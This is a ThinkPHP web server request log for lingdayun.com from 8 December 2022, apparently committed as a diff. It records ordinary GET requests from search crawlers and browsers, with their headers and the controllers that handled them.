+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T11:57:25+08:00 ] 10.0.8.4 117.25.139.73 GET /
+[ log ] lingdayun.com/ [运行时间：0.093132s][吞吐率：10.74req/s] [内存消耗：1,276.53kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'host' => 'lingdayun.com',
+  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'accept-charset' => 'GB2312,utf-8;q=0.7,*;q=0.7',
+  'accept-language' => 'zh-cn,zh;q=0.5',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T11:57:37+08:00 ] 10.0.8.4 121.10.143.23 GET /
+[ log ] lingdayun.com/ [运行时间：0.088578s][吞吐率：11.29req/s] [内存消耗：1,276.43kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-cn,zh;q=0.5',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T11:59:34+08:00 ] 10.0.8.4 121.10.143.23 GET /
+[ log ] lingdayun.com/ [运行时间：0.079641s][吞吐率：12.56req/s] [内存消耗：1,276.43kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-charset' => 'GBK,utf-8;q=0.7,*;q=0.7',
+  'accept-encoding' => 'gzip, deflate',
+  'accept-language' => 'zh-cn,zh;q=0.5',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T12:00:30+08:00 ] 10.0.8.4 114.111.30.116 GET /
+[ log ] lingdayun.com/ [运行时间：0.077388s][吞吐率：12.92req/s] [内存消耗：1,276.88kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-US',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T12:01:01+08:00 ] 10.0.8.4 111.173.114.215 GET /
+[ log ] lingdayun.com/ [运行时间：0.076253s][吞吐率：13.11req/s] [内存消耗：1,276.43kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T12:01:30+08:00 ] 10.0.8.4 116.179.32.134 GET /
+[ log ] lingdayun.com/ [运行时间：0.079562s][吞吐率：12.57req/s] [内存消耗：1,276.21kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'accept-language' => 'zh-cn,zh-tw',
+  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+  'connection' => 'close',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T12:09:41+08:00 ] 10.0.8.4 113.24.224.26 GET /
+[ log ] lingdayun.com/ [运行时间：0.082480s][吞吐率：12.12req/s] [内存消耗：1,276.45kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'lingdayun.com',
+  'accept-language' => 'en-US,*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'referer' => 'http://www.baidu.com/s?wd=hallycj',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T12:33:21+08:00 ] 10.0.8.4 40.77.167.15 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.082201s][吞吐率：12.17req/s] [内存消耗：1,276.48kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36',
+  'host' => 'www.lingdayun.com',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'cache-control' => 'no-cache',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T12:49:49+08:00 ] 10.0.8.4 223.72.83.250 GET /
+[ log ] lingdayun.com/ [运行时间：0.082575s][吞吐率：12.11req/s] [内存消耗：1,276.70kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T12:57:10+08:00 ] 10.0.8.4 180.101.244.11 GET /
+[ log ] lingdayun.com/ [运行时间：0.088627s][吞吐率：11.28req/s] [内存消耗：1,276.76kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'cache-control' => 'max-age=0',
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T13:19:02+08:00 ] 10.0.8.4 106.115.54.54 GET /
+[ log ] lingdayun.com/ [运行时间：0.086052s][吞吐率：11.62req/s] [内存消耗：1,276.55kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'host' => 'lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T13:57:30+08:00 ] 10.0.8.4 223.72.83.250 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.086502s][吞吐率：11.56req/s] [内存消耗：1,276.73kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T13:57:38+08:00 ] 10.0.8.4 113.24.224.213 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.078886s][吞吐率：12.68req/s] [内存消耗：1,276.36kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.lingdayun.com',
+  'accept-language' => 'en-US,*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'referer' => 'http://www.baidu.com/s?wd=noisezrq',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T14:01:24+08:00 ] 10.0.8.4 114.111.30.116 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.090314s][吞吐率：11.07req/s] [内存消耗：1,277.05kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-US',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T14:01:37+08:00 ] 10.0.8.4 114.111.30.116 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.081480s][吞吐率：12.27req/s] [内存消耗：1,277.05kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-US',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T14:04:48+08:00 ] 10.0.8.4 114.111.30.116 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.090343s][吞吐率：11.07req/s] [内存消耗：1,277.05kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'en-US',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 6.0.1; SOV33 Build/35.0.D.0.326) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.91 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T14:10:39+08:00 ] 10.0.8.4 40.77.167.15 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.081756s][吞吐率：12.23req/s] [内存消耗：1,276.48kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36',
+  'host' => 'www.lingdayun.com',
+  'from' => 'bingbot(at)microsoft.com',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'pragma' => 'no-cache',
+  'connection' => 'close',
+  'cache-control' => 'no-cache',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T14:13:18+08:00 ] 10.0.8.4 42.236.12.226 GET /
+[ log ] lingdayun.com/ [运行时间：0.091904s][吞吐率：10.88req/s] [内存消耗：1,276.68kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'cache-control' => 'max-age=259200',
+  'host' => 'lingdayun.com',
+  'accept-language' => 'en-US',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T14:14:31+08:00 ] 10.0.8.4 42.236.12.226 GET /
+[ log ] lingdayun.com/ [运行时间：0.084206s][吞吐率：11.88req/s] [内存消耗：1,276.68kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'cache-control' => 'max-age=259200',
+  'host' => 'lingdayun.com',
+  'accept-language' => 'en-US',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T14:43:34+08:00 ] 10.0.8.4 124.71.166.204 GET /
+[ log ] www.lingdayun.com/ [运行时间：0.102055s][吞吐率：9.80req/s] [内存消耗：1,276.59kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.8; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3785.88 Safari/537.36',
+  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
+  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T14:43:34+08:00 ] 10.0.8.4 124.71.166.204 GET /index.html
+[ log ] www.lingdayun.com/index.html [运行时间：0.081081s][吞吐率：12.33req/s] [内存消耗：1,279.57kb] [文件加载：44]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'upgrade-insecure-requests' => '1',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 8.5; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.2815.88 Safari/537.36',
+  'accept-language' => 'zh-CN, zh; q=0.9, en; q=0.8, ko; q=0.7',
+  'accept' => 'text/html, application/xhtml+xml, application/xml; q=0.9, image/webp; q=0.8',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+  '/index_html' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ C:\wwwroot\www.lingdayun.com\application\index\controller\Index.php ]
+[ info ] [ VIEW ] C:\wwwroot\www.lingdayun.com\public/../application/index\view\index\index.html [ array (
+) ]
+[ info ] [ LOG ] INIT File
+
+---------------------------------------------------------------
+[ 2022-12-08T15:30:44+08:00 ] 10.0.8.4 223.104.197.123 GET /index.php/index/api/tankuang
+[ log ] www.lingdayun.com/index.php/index/api/tankuang [运行时间：0.109466s][吞吐率：9.14req/s] [内存消耗：1,916.30kb] [文件加载：52]
+[ info ] [ LANG ] C:\wwwroot\www.lingdayun.com\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'index',
+    1 => 'api',
+    2 => 'tankuang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-requested-with' => 'XMLHttpRequest',
+  'accept-language' => 'zh-CN,zh-Hans;q=0.9',
+  'referer' => 'http://www.lingdayun.com/html/shequ_index.html',
+  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.30(0x18001e32) NetType/4G Language/zh_CN',
+  'accept' => 'application/json, text/javascript, */*; q=0.01',
+  'connection' => 'close',
+  'accept-encoding' => 'gzip, deflate',
+  'host' => 'www.lingdayun.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Api->tankuang[ C:\wwwroot\www.lingdayun.com\application\index\controller\Api.php ]
